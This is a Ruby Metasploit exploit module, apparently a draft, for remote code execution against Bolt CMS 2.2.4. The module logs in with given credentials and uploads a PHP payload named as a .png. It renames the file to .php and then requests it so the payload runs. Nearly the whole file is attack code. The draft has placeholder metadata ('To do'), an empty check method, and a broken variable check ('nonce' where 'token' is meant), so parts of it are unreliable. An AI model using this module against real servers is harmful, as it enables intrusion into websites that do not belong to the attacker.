##
# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'Bolt File Upload',
      'Description'     => %q{
          To do.
        },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'To do', # Vulnerability Disclosure
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'References'      =>
        [
          ['URL', 'http://todo.com']
        ],
      'DisclosureDate'  => 'Aug 17 2015',
      'Platform'        => 'php',
      'Arch'            => ARCH_PHP,
      'Targets'         => [['Bolt 2.2.4', {}]],
      'DefaultTarget'   => 0
    ))

    register_options(
      [
        OptString.new('USERNAME', [true, 'The username to authenticate with']),
        OptString.new('PASSWORD', [true, 'The password to authenticate with'])
      ], self.class)
  end

  def check

  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def bolt_login(user, pass)
    res = send_request_cgi(
      'method'      => 'GET',
      'uri'         => normalize_uri(target_uri.path, 'bolt', 'bolt', 'login')
    )

    session_cookie = res.get_cookies
    vprint_status('Logging in...')
    res = send_request_cgi(
      'method'      => 'POST',
      'uri'         => normalize_uri(target_uri.path, 'bolt', 'bolt', 'login'),
      'cookie'      => session_cookie,
      'vars_post'   => {
        'username'  => user,
        'password'  => pass,
        'action'    => 'login'
      }
    )

    unless res && res.code == 302
      print_error("#{peer} - Login failed")
    end

    if res.code == 302 && res.redirection.to_s.include?('/bolt/bolt')
      session_cookie = res.get_cookies
      return session_cookie
    end
    nil
  end

  def get_token(cookie)
    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => normalize_uri(target_uri, 'bolt', 'bolt', 'files', 'theme', 'base-2014'),
      'cookie'    => cookie
    )

    unless res
      print_error("#{peer} - Unable to connect in the Server")
      return
    end

    if res && res.code == 200 && res.body =~ / name="form\[_token\]" value="(.+)" /
      return Regexp.last_match[1]
    end
    nil
  end

  def rename_payload(cookie, payload)
        res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, 'bolt', 'async', 'renamefile'),
      'vars_post'   => {
        'namespace' => 'theme',
        'parent'    => 'base-2014',
        'oldname'   => "#{payload}.png",
        'newname'   => "#{payload}.php"
      },
      'cookie'      => cookie
    )

    unless res
      vprint_error("#{peer} - Unable to rename de file.")
      return
    end

    if res.code == 200
      return true
    end
    nil
  end

  def exploit
    vprint_status("#{peer} - Authenticating using #{username}:#{password}...")
    cookie = bolt_login(username, password)
    if cookie.nil?
      print_error("#{peer} - Failed to authenticate with Bolt")
      return
    end
    vprint_good("#{peer} - Authenticated with Bolt")

    token = get_token(cookie)
    if nonce.nil?
      print_error("#{peer} - No nonce")
      return
    end
    vprint_good("#{peer} - Token #{token} found.")

        vprint_status("#{peer} - Preparing payload...")
    payload_name = Rex::Text.rand_text_alpha_lower(10)

    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, 'image/png', nil, "form-data; name=\"form[FileUpload][]\"; filename=\"#{payload_name}.png\"")
    data.add_part("#{token}", nil, nil, 'form-data; name="form[_token]"')
    post_data = data.to_s

    print_status("#{peer} - Uploading payload...")
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri, 'bolt', 'bolt', 'files', 'theme', 'base-2014'),
      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
      'data'      => post_data,
      'cookie'    => cookie
    )

    unless res
      print_error("#{peer} - No response from the target")
    end

    if res.code == 304
      print_good("#{peer} - Uploaded the payload")
    end

    rename = rename_payload(cookie, payload_name)
    if rename.nil?
      vprint_error("#{peer} - No renamed filename")
      return
    end

    php_file_name = "#{payload_name}.php"
    payload_url = normalize_uri(target_uri.path, 'bolt', 'theme', 'base-2014', php_file_name)
    vprint_good("#{peer} - Parsed response")

    register_files_for_cleanup(php_file_name)
    vprint_status("#{peer} - Executing the payload at #{payload_url}")
    send_request_cgi(
      'uri'     => payload_url,
      'method'  => 'GET'
    )
    vprint_good("#{peer} - Executed payload")
  end
end
